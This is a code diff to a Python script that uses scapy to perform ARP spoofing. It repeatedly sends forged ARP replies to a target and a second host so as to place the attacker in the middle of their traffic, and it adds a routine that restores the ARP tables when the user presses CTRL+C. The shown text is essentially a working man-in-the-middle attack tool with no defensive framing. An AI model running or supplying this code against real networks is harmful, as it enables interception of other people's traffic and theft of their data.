@@ -3,6 +3,7 @@
 import scapy.all as scapy
 import argparse
 import time
+import sys
 
 def get_arguments():
     parser = argparse.ArgumentParser()
@@ -29,11 +30,24 @@ def spoof(target, spoof):
     # to list all the parameters : scapy.ls(scapy.ARP)
     scapy.send(packet, verbose=False)
 
+def restore(dest_ip, source_ip):
+    dest_mac = get_mac(dest_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
+    scapy.send(packet, count=4, verbose=False)
+
 options = get_arguments()
 sent_packets = 0
-while True:
-    spoof(options.target, options.spoof)
-    spoof(options.spoof,options.target)
-    sent_packets += 2
-    print("\r[+] Packets sent: " + str(sent_packets), end="")
-    time.sleep(2)
+
+try:
+    while True:
+        spoof(options.target, options.spoof)
+        spoof(options.spoof,options.target)
+        sent_packets += 2
+        print("\r[+] Packets sent: " + str(sent_packets)),
+        sys.stdout.flush()
+        time.sleep(2)
+except KeyboardInterrupt:
+    print("\n[-] CTRL + C detected ... restoring ARP tables ... Exiting\n")
+    restore(options.target, options.spoof)
+    restore(options.spoof,options.target)
